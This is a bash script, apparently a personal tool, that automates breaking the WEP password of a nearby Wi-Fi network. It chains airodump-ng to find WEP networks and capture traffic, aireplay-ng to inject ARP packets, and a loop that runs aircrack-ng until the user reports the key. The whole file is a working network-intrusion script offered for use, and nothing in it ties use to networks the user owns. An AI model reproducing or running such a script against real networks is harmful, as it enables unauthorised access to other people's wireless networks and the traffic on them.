#!/bin/bash
#
# It's to break WEP password in a Wi-fi network
#
# Gabriel Richter <gabrielrih@gmail.com>
# Last Modification: 
#
# More information: http://gabrielrih.wixsite.com/wiki/invadir-rede-wi-fi-com-criptografia-wep
#


# CHANGELOG.
# v1     	Basic functions
# v1.1          Kill process

# USAGE
USE="Usage: $0 [interface] 

[Parameters]
interface       Fill PROMISCUOUS interface (Eg. mon0)

Example:	$0 mon0

OBS: You MUST run setPromiscuousInterface.sh before"

# Checking parameters number
if [ $# != 1 ]
then
	echo "$USE"
	exit 1
fi

# Check if is sudo
user=$(whoami)

if [ $user != 'root' ]
then
        echo "Please, run it as sudo"
        exit 1
fi

# Variables
interface=$1                            # promiscuous interface
tmpDir="tmpWEP"                         # used to save CAP files
outNameFile="CrackMeWEP"                # used to airodump-ng to record network packets
finalNameFile=$outNameFile"-01.cap"     # used to aircrack-ng to break WEP password

# Create temporary directory
if [ ! -d $tmpDir ]
then
    mkdir $tmpDir
else
    rm -R $tmpDir
    mkdir $tmpDir
fi


# Start airodump to check if have any WEB network
xterm -e "airodump-ng --encrypt WEP $interface" & AIRODUMPPID=$!

echo "STEP 1: You need check if there is any WEP network aroung you."
echo "If you find it press ENTER"
read anything

echo "STEP 2: Copy BSSID, ESSID and CHANNEL of the WEP network and informe bellow"
echo "BSSID: \c"; read bssid
echo "ESSID: \c"; read essid
echo "CHANNEL: \c"; read channel

# Kill airodump-ng process
kill ${AIRODUMPPID}

# Start airodump again, but now recording the traffic in a file
xterm -e "airodump-ng --bssid $bssid --channel $channel -w $tmpDir/$outNameFile $interface" & AIRODUMPPID=$!

# Start aireplay-ng to inject ARP packets
xterm -e "aireplay-ng -3 -b $bssid -e $essid $interface --ignore-negative-one" & AIREPLAYPID1=$!
#xterm -e "aireplay-ng -3 -b $bssid -e $essid $interface --ignore-negative-one" & AIREPLAYPID2=$!
#xterm -e "aireplay-ng -3 -b $bssid -e $essid $interface --ignore-negative-one" & AIREPLAYPID3=$!

#xterm -e "packetforge-ng -0 -a $bssid -h AA:AA:AA:AA:AA:AA -k 255.255.255.255 -l 255.255.255.255 $interface" & PACKETPID=$!

echo ""
echo "READY:"
echo "- The airodump-ng is capturing network traffic"
echo "- The aireplay is looking for ARP packets in the traffic. If \
it is found, the aireplay will inject more ARP packets"
echo "- The aircrack is trying crack the WEP password."
echo ""

# Start aircrack to break WEP password
while true
do
    xterm -e "aircrack-ng $tmpDir/$finalNameFile" & AIRCRACK=$!
    echo -n "MESSAGE: Did you get the key? (yes or no)"
    read CONFIRM
    
    case $CONFIRM in
        y|Y|YES|yes|Yes)
            break;;
        *)
            echo "MESSAGE: Will attempt to crack again" & sleep 3
    esac
    
    kill ${AIRCRACK}
done

# Kill process
kill ${AIRCRACK}
kill ${AIRODUMPPID}
kill ${AIREPLAYPID1}
#kill ${AIREPLAYPID2}
#kill ${AIREPLAYPID3}
#kill ${PACKETPID}

# Erase temporary directory
if [ -d $tmpDir ]
then
    rm -R $tmpDir
fi

exit 0